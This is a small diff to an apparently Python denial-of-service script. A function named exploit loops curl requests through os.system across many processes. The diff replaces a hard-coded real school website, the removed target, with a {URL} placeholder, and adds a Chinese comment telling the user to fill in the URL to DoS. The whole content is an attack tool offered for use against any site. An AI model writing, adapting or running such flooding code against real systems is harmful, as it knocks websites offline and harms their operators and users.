@@ -5,7 +5,8 @@ import time
 def exploit(x):
     for i in range(300):
         print("connect!")
-        os.system('curl -o log -s https://www.cksh.tp.edu.tw')
+        # 在{URL}中填入要DoS的目標url
+        os.system('curl -o log -s {URL}')
     
 
 num_processes = 300  # 設定要創建的進程數量
